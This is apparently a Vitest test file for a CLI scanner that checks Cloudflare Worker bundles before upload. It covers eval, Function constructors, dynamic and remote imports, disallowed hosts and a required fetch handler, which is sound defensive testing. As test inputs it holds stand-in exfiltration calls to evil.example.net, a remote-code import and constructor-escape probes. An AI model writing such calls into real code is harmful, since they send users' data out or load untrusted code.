import { describe, expect, it } from 'vitest';
import { checkBundleCode, hostAllowed, isTassyirHost } from './bundle-code.js';

// The scan's code checks as the CLI runs them before an upload. The cases
// are the scan's own (tassyir/backend `tools/app-scans/test/js-analysis.test.mjs`
// and `static-checks.test.mjs`: the same sources, the same rules and
// severities), plus the CLI's two rules of its own (`node:` refused, a
// `fetch` handler required).

const HANDLER =
  'export default { async fetch() { return new Response("ok"); } };\n';
const ALLOWED = ['graph.facebook.com', '*.example.com'];

function check(source: string, allowedHosts: readonly string[] = ALLOWED) {
  return checkBundleCode(
    [{ path: 'worker.js', content: `${source}\n${HANDLER}` }],
    'worker.js',
    allowedHosts,
  );
}

/** `rule:severity` of every finding, sorted, as the scan's specs write them. */
function rules(source: string, allowedHosts?: readonly string[]): string[] {
  return check(source, allowedHosts)
    .findings.map((finding) => `${finding.rule}:${finding.severity}`)
    .sort();
}

describe('the scan’s banned_apis, before the upload', () => {
  it('eval: a run-time argument is an error, a literal a warning, indirect forms too', () => {
    expect(rules('eval(code)')).toEqual(['eval:error']);
    expect(rules('globalThis.eval(code)')).toEqual(['eval:error']);
    expect(rules('(0, eval)(code)')).toEqual(['eval:error']);
    expect(rules('eval("1")')).toEqual(['eval:warning']);
  });

  it('the Function constructor: a probe warns, real code fails', () => {
    expect(rules('new Function("")')).toEqual(['function-constructor:warning']);
    expect(rules('Function()')).toEqual(['function-constructor:warning']);
    expect(rules('new Function("a", "return a")')).toEqual([
      'function-constructor:error',
    ]);
    expect(rules('new Function(body)')).toEqual(['function-constructor:error']);
    expect(rules('x.constructor.constructor("return this")()')).toEqual([
      'constructor-constructor:error',
    ]);
  });

  it('timers with a string, import() of a run-time name, WebAssembly', () => {
    expect(rules('setTimeout("alert(1)", 10)')).toEqual(['string-timer:error']);
    expect(rules('setTimeout(() => 1, 10)')).toEqual([]);
    expect(rules('import(name)')).toEqual(['dynamic-import:error']);
    expect(rules('import(`./chunk-${n}.js`)')).toEqual([
      'dynamic-import:error',
    ]);
    expect(rules('import("./chunk.js")')).toEqual([]);
    expect(rules('WebAssembly.instantiate(bytes)')).toEqual([
      'webassembly:warning',
    ]);
  });

  it('imports: sockets, URLs and unbundled packages fail; node: fails too (the scan only warns)', () => {
    expect(
      rules(`
        import { connect } from 'cloudflare:sockets';
        import x from 'https://evil.example.net/x.js';
        import y from 'lodash';
        import { Buffer } from 'node:buffer';
        import z from './chunk.js';
        import { WorkerEntrypoint } from 'cloudflare:workers';
      `),
    ).toEqual([
      'node-builtin:error',
      'raw-socket:error',
      'remote-import:error',
      'unbundled-import:error',
    ]);
    expect(rules("const fs = await import('node:fs');")).toEqual([
      'node-builtin:error',
    ]);
    expect(rules("export * from 'node:path';")).toEqual(['node-builtin:error']);
  });

  it('a module that does not parse says so', () => {
    const result = checkBundleCode(
      [{ path: 'worker.js', content: 'export default {' }],
      'worker.js',
      [],
    );
    expect(result.errors).toEqual([
      expect.objectContaining({
        code: 'BUNDLE_PARSE_ERROR',
        path: 'worker.js',
      }),
    ]);
  });

  it('reads ES modules only: a text module is never parsed', () => {
    const result = checkBundleCode(
      [
        { path: 'worker.js', content: HANDLER },
        {
          path: 'page.html',
          content: '<script>eval(x); fetch("https://api.tassyir.io")</script>',
        },
      ],
      'worker.js',
      [],
    );
    expect(result.findings).toEqual([]);
  });
});

describe('the scan’s manifest_hosts (requests), before the upload', () => {
  it('a clean worker passes', () => {
    expect(
      rules(`
        const r = await fetch('https://graph.facebook.com/v20.0/me');
        const s = await fetch('https://api.example.com/x');
      `),
    ).toEqual([]);
  });

  it('a request to a host outside allowed_hosts fails; a Tassyir host and http fail too', () => {
    expect(
      rules(`
        fetch('https://evil.example.net/collect');
        fetch('https://user@evil.example.net/');
        fetch('https://api.tassyir.io/apps/2026-10/orders');
        fetch('http://graph.facebook.com/me');
        fetch('https://example.com/'); // the wildcard is subdomains only
      `),
    ).toEqual([
      'host-not-allowed:error',
      'host-not-allowed:error',
      'host-not-allowed:error',
      'not-https:error',
      'tassyir-host:error',
    ]);
  });

  it('a host built at run time warns; a relative URL is the app itself', () => {
    expect(rules('fetch(`https://${host}/x`); fetch("/api/save");')).toEqual([
      'dynamic-host:warning',
    ]);
  });

  it('never lets a hosted app call Tassyir over the network, by any of the request forms', () => {
    for (const source of [
      "fetch('https://api.tassyir.io/apps/2026-10/orders')",
      "globalThis.fetch('https://api.tassyir.io/apps/2026-10/orders')",
      "new Request('https://api.tassyir.io/apps/2026-10/orders')",
      "fetch('https://' + 'api.tassyir.io' + '/x')",
      'fetch(`https://api.tassyir.io/apps/2026-10/orders/${id}`)',
      "new WebSocket('wss://shop.tassyir.shop/live')",
      "fetch('https://reviews.tassyir-apps.com/x')",
    ]) {
      expect(rules(source, ['api.tassyir.io']), source).toEqual([
        'tassyir-host:error',
      ]);
    }
    expect(isTassyirHost('tassyir.io.evil.example')).toBe(false);
  });

  it('matches allowed_hosts as the scan does: exact, or *. for subdomains only', () => {
    expect(hostAllowed('graph.facebook.com', ALLOWED)).toBe(true);
    expect(hostAllowed('GRAPH.facebook.com.', ALLOWED)).toBe(true);
    expect(hostAllowed('a.b.example.com', ALLOWED)).toBe(true);
    expect(hostAllowed('example.com', ALLOWED)).toBe(false);
    expect(hostAllowed('facebook.com', ALLOWED)).toBe(false);
  });
});

describe('the fetch handler (the CLI’s own rule)', () => {
  const handler = (source: string) =>
    checkBundleCode([{ path: 'worker.js', content: source }], 'worker.js', [])
      .errors;

  it.each([
    ['an object literal', HANDLER],
    [
      'a method shorthand by name',
      'const fetch = () => new Response(); export default { fetch };',
    ],
    [
      'esbuild’s `export { x as default }`',
      'var worker_default = { fetch() {} };\nexport { worker_default as default };',
    ],
    [
      'a chain of names',
      'const a = { "fetch": async () => 1 }; const b = a; export default b;',
    ],
    ['a class with fetch', 'export default class { fetch() {} }'],
    [
      'a subclass (it may inherit fetch)',
      'export default class extends WorkerEntrypoint {}',
    ],
    [
      'an object built at run time (Hono)',
      'const app = new Hono(); export default app;',
    ],
    ['an object with a spread', 'export default { ...handlers };'],
  ])('passes %s', (_name, source) => {
    expect(handler(source)).toEqual([]);
  });

  it.each([
    ['no default export', 'export const fetch = () => 1;'],
    ['an object without fetch', 'export default { scheduled() {} };'],
    ['a class without fetch', 'export default class { scheduled() {} }'],
    [
      'a function',
      'export default function (request) { return new Response(); }',
    ],
    ['an arrow function', 'const h = () => 1; export default h;'],
    ['a literal', 'export default 42;'],
  ])('refuses %s', (_name, source) => {
    expect(handler(source)).toEqual([
      expect.objectContaining({
        code: 'BUNDLE_NO_FETCH_HANDLER',
        path: 'worker.js',
        fix: expect.stringContaining('export default { async fetch') as string,
      }),
    ]);
  });

  it('checks main only: another module needs no handler', () => {
    const result = checkBundleCode(
      [
        { path: 'worker.js', content: HANDLER },
        { path: 'lib.js', content: 'export const x = 1;' },
      ],
      'worker.js',
      [],
    );
    expect(result.errors).toEqual([]);
  });
});

describe('the answer', () => {
  it('refusals are problems { code, path, message, fix }, errors first, warnings as lines', () => {
    const result = check(`
      eval("1");
      import('node:fs');
      fetch('https://api.tassyir.io/x');
    `);
    expect(result.errors.map((error) => error.code)).toEqual([
      'BUNDLE_NODE_IMPORT',
      'BUNDLE_TASSYIR_HOST',
    ]);
    for (const error of result.errors) {
      expect(error.path).toMatch(/^worker\.js:\d+$/);
      expect(error.message.length).toBeGreaterThan(0);
      expect(error.fix.length).toBeGreaterThan(0);
    }
    expect(result.warnings).toEqual([
      expect.stringMatching(
        /^worker\.js:2: eval\(\) is not allowed on Workers\.$/,
      ),
    ]);
  });

  it('names the source of a finding when the locator knows it', () => {
    const result = checkBundleCode(
      [{ path: 'worker.js', content: `import('node:fs');\n${HANDLER}` }],
      'worker.js',
      [],
      (file, line) =>
        file === 'worker.js' && line === 1 ? 'src/worker.ts:7' : null,
    );
    expect(result.errors[0]).toMatchObject({
      code: 'BUNDLE_NODE_IMPORT',
      path: 'src/worker.ts:7',
    });
  });

  it('gives the same answer for the same bundle', () => {
    const source =
      "import('node:fs'); eval(x); fetch('https://evil.example.net');";
    expect(check(source)).toEqual(check(source));
  });
});
